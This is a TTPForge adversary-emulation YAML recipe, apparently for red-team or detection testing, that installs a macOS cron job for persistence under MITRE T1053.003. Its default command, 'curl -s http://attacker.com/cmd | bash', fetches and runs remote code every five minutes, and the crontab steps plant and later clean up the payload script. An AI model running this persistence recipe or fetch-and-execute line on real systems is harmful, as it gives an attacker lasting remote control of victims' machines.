---
api_version: 2.0
uuid: 79be3a37-77e3-4849-962d-2a9743db8c94
name: Cron job creation
authors:
- TTPForge
description: |
  Creates a cron job for scheduled malicious code execution
mitre:
  tactics:
  - TA0003 Persistence
  techniques:
  - T1053 Scheduled Task/Job
  subtechniques:
  - 'T1053.003 Scheduled Task/Job: Cron'
requirements:
  platforms:
  - os: darwin
args:
- name: cron_expression
  description: Cron expression for job scheduling
  type: string
  default: '*/5 * * * *'
- name: cron_command
  description: Command to execute via cron
  type: string
  default: /usr/bin/curl -s http://attacker.com/cmd | bash
- name: script_path
  description: Path to create cron script
  type: string
  default: /usr/local/bin/cron_payload.sh
steps:
- name: create_cron_script
  create_file: '{{ .Args.script_path }}'
  contents: |
    #!/bin/bash
    # Cron job payload
    {{ .Args.cron_command }}
    echo "Cron job executed at $(date)" >> /tmp/cron.log
  mode: 493
  cleanup: default
- name: add_cron_job
  inline: |
    (crontab -l 2>/dev/null; echo "{{ .Args.cron_expression }} {{ .Args.script_path }}") | crontab -
  cleanup:
    inline: |-
      crontab -l 2>/dev/null | grep -v "{{ .Args.script_path }}" | crontab - 2>/dev/null || true

      rm -f "{{ .Args.script_path }}"
      rm -f "/tmp/cron.log"
tests:
- name: dry_run_test
  dry_run: true
